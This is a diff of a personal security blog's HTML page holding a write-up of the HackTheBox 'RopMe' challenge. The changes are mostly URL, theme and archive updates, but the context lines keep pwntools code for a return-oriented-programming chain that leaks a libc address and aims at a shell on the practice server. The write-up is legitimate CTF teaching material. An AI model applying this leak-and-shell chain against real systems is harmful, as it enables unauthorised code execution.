@@ -1,7 +1,7 @@
 <!doctype html>
 <!--
-  Minimal Mistakes Jekyll Theme 4.19.3 by Michael Rose
-  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Minimal Mistakes Jekyll Theme 4.22.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
   Free for personal and commercial use under the MIT license
   https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
 -->
@@ -14,13 +14,16 @@
 
 
   <meta name="author" content="Philipp Menner">
+  
+  <meta property="article:author" content="Philipp Menner">
+  
 
 
 <meta property="og:type" content="article">
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="#keepLearning">
 <meta property="og:title" content="Write-up: HackThebox - RopMe">
-<meta property="og:url" content="http://localhost:4000/challenges/RopMe/">
+<meta property="og:url" content="https://vpm.rocks/challenges/RopMe/">
 
 
   <meta property="og:description" content="A challenge to practice return-oriented programming.">
@@ -42,7 +45,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/challenges/RopMe/">
+<link rel="canonical" href="https://vpm.rocks/challenges/RopMe/">
 
 
 
@@ -53,7 +56,7 @@
     
       "@type": "Person",
       "name": "Philipp Menner",
-      "url": "http://localhost:4000/"
+      "url": "https://vpm.rocks/"
     
   }
 </script>
@@ -66,7 +69,7 @@
 <!-- end _includes/seo.html -->
 
 
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="#keepLearning Feed">
+
 
 <!-- https://t.co/dKP3o1e -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -77,6 +80,7 @@
 
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
 
 <!--[if IE]>
   <style>
@@ -94,17 +98,10 @@
 <![endif]-->
 
 
-
     <!-- start custom head snippets -->
 
 <!-- insert favicons. use https://realfavicongenerator.net/ -->
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="theme-color" content="#ffffff">
+
 <!-- end custom head snippets -->
 
   </head>
@@ -130,7 +127,7 @@
     <div class="masthead__menu">
       <nav id="site-nav" class="greedy-nav">
         
-          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt=""></a>
+          <a class="site-logo" href="/"><img src="/assets/images/88x88.png" alt="#keepLearning"></a>
         
         <a class="site-title" href="/">
           #keepLearning
@@ -179,15 +176,26 @@
           <h1 id="page-title" class="page__title" itemprop="headline">Write-up: HackThebox - RopMe
 </h1>
           
-            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
 
 
-
-
-  6 minute read
-
-</p>
-          
         </header>
       
 
@@ -196,18 +204,7 @@
           <aside class="sidebar__right sticky">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-cog"></i> Table of Contents</h4></header>
-              <ul class="toc__menu">
-  <li><a href="#overview">Overview</a></li>
-  <li><a href="#looking-into">Looking into</a></li>
-  <li><a href="#first-lap---collecting-addresses">First lap - collecting addresses</a></li>
-  <li><a href="#second-lap---getting-shell">Second lap - getting shell</a></li>
-  <li><a href="#appendix">Appendix</a>
-    <ul>
-      <li><a href="#code">Code</a></li>
-      <li><a href="#resources">Resources</a></li>
-    </ul>
-  </li>
-</ul>
+              <ul class="toc__menu"><li><a href="#overview">Overview</a></li><li><a href="#looking-into">Looking into</a></li><li><a href="#first-lap---collecting-addresses">First lap - collecting addresses</a></li><li><a href="#second-lap---getting-shell">Second lap - getting shell</a></li><li><a href="#appendix">Appendix</a><ul><li><a href="#code">Code</a></li><li><a href="#resources">Resources</a></li></ul></li></ul>
 
             </nav>
           </aside>
@@ -268,7 +265,7 @@ Now onto the binary. Looking at the code in <code class="language-plaintext high
 
 <span class="n">p</span><span class="p">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s">"ROP me outside"</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">b''</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>	<span class="c1"># Sufficiently large byte string
 </span><span class="n">pause</span><span class="p">()</span>				<span class="c1"># If this pause() has been reached, we run gdb -p $(pidof ropme)
 </span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -297,17 +294,17 @@ Now onto the binary. Looking at the code in <code class="language-plaintext high
 <span class="gp">0000000000400626 &lt;main&gt;</span>:
 </code></pre></div></div>
 <p>This leads to a payload of</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span>     <span class="o">=</span> <span class="s">b'A'</span><span class="o">*</span><span class="mi">72</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span>     <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">72</span>
 <span class="n">puts_plt</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span>	<span class="c1"># p64 for 64-bit and correct endianess
 </span><span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006d3</span><span class="p">)</span>
 <span class="n">ret_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400626</span><span class="p">)</span>
 <span class="n">puts_got</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">b''</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">puts_got</span> <span class="o">+</span> <span class="n">puts_plt</span> <span class="o">+</span> <span class="n">ret_main</span>
 
 <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
 <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked puts address: 0x%x"</span> <span class="o">%</span> <span class="n">leaked_puts</span><span class="p">)</span>
 </code></pre></div></div>
 <p>So after the junk, <code class="language-plaintext highlighter-rouge">pop rdi</code> will load the subsequent address into the RDI register, which is the address of puts in the GOT and this is the address that <code class="language-plaintext highlighter-rouge">puts</code> will print when called - so we add <code class="language-plaintext highlighter-rouge">puts_plt</code>.
@@ -365,7 +362,7 @@ spawn.sh
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"docker.hackthebox.eu"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">30948</span>
 
-<span class="n">junk</span>     <span class="o">=</span> <span class="s">b'A'</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">junk</span>     <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">72</span>
 <span class="n">puts_plt</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span>
 <span class="n">pop_rdi</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006d3</span><span class="p">)</span>
 <span class="n">ret_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400626</span><span class="p">)</span>
@@ -375,13 +372,13 @@ spawn.sh
 </span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 <span class="n">p</span><span class="p">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s">"ROP me outside"</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">b''</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">junk</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">puts_got</span> <span class="o">+</span> <span class="n">puts_plt</span> <span class="o">+</span> <span class="n">ret_main</span> <span class="c1"># calls main after 1st return
 </span>
 <span class="c1"># Part one
 </span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
 <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked puts address: 0x%x"</span> <span class="o">%</span> <span class="n">leaked_puts</span><span class="p">)</span>
 
 <span class="c1"># Part two
@@ -412,19 +409,13 @@ spawn.sh
 
 
   
-  
-  
 
   <p class="page__taxonomy">
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      
-      
       <a href="/tags/#pwn" class="page__taxonomy-item" rel="tag">pwn</a><span class="sep">, </span>
     
-      
-      
       <a href="/tags/#rop" class="page__taxonomy-item" rel="tag">ROP</a>
     
     </span>
@@ -437,15 +428,11 @@ spawn.sh
 
 
   
-  
-  
 
   <p class="page__taxonomy">
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
     <span itemprop="keywords">
     
-      
-      
       <a href="/categories/#challenges" class="page__taxonomy-item" rel="tag">challenges</a>
     
     </span>
@@ -463,11 +450,11 @@ spawn.sh
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?text=Write-up%3A+HackThebox+-+RopMe%20http%3A%2F%2Flocalhost%3A4000%2Fchallenges%2FRopMe%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Write-up%3A+HackThebox+-+RopMe%20https%3A%2F%2Fvpm.rocks%2Fchallenges%2FRopMe%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fchallenges%2FRopMe%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fvpm.rocks%2Fchallenges%2FRopMe%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fchallenges%2FRopMe%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fvpm.rocks%2Fchallenges%2FRopMe%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -501,23 +488,34 @@ spawn.sh
 <div class="grid__item">
   <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
     
-    <h2 class="archive__item-title" itemprop="headline">
+    <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/boxes/Schooled/" rel="permalink">Writeup: HackTheBox - Schooled
+        <a href="/protected/theneedle/" rel="permalink">HackTheBox - The Needle
 </a>
       
     </h2>
     
-      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
 
-
-
-
-  8 minute read
-
-</p>
+  <p class="page__meta">
     
-    <p class="archive__item-excerpt" itemprop="description">Write-up of the box Schooled from Hack The Box
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the hardware challenge The Needle from Hack The Box
 </p>
   </article>
 </div>
@@ -530,81 +528,114 @@ spawn.sh
 <div class="grid__item">
   <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
     
-    <h2 class="archive__item-title" itemprop="headline">
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/debugging_interface/" rel="permalink">HackTheBox - Debugging Interface
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up of the challenge Debugging Interface from Hack The Box
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/protected/Schooled-active/" rel="permalink">Writeup: HackTheBox - Schooled
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          9 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Schooled is a FreeBSD box that I enjoyed greatly.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
       
         <a href="/boxes/Time/" rel="permalink">Write-up: HackTheBox - Time
 </a>
       
     </h2>
     
-      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
 
-
-
-
-  5 minute read
-
-</p>
+  <p class="page__meta">
     
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
     <p class="archive__item-excerpt" itemprop="description">Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.
-</p>
-  </article>
-</div>
-
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title" itemprop="headline">
-      
-        <a href="/boxes/travel/" rel="permalink">Write-up: HackTheBox - Travel
-</a>
-      
-    </h2>
-    
-      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
-
-
-
-
-  8 minute read
-
-</p>
-    
-    <p class="archive__item-excerpt" itemprop="description">Cool box with little guessing and much to learn.
-</p>
-  </article>
-</div>
-
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title" itemprop="headline">
-      
-        <a href="/boxes/player2/" rel="permalink">Write-up: HackTheBox - PlayerTwo
-</a>
-      
-    </h2>
-    
-      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
-
-
-
-
-  25 minute read
-
-</p>
-    
-    <p class="archive__item-excerpt" itemprop="description">One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!
 </p>
   </article>
 </div>
@@ -658,7 +689,7 @@ spawn.sh
       
     
 
-    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
   </ul>
 </div>
 
@@ -669,7 +700,6 @@ spawn.sh
 
     
   <script src="/assets/js/main.min.js"></script>
-  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
 
 
 
@@ -677,8 +707,6 @@ spawn.sh
 <script src="/assets/js/lunr/lunr.min.js"></script>
 <script src="/assets/js/lunr/lunr-store.js"></script>
 <script src="/assets/js/lunr/lunr-en.js"></script>
-
-
 
 
 
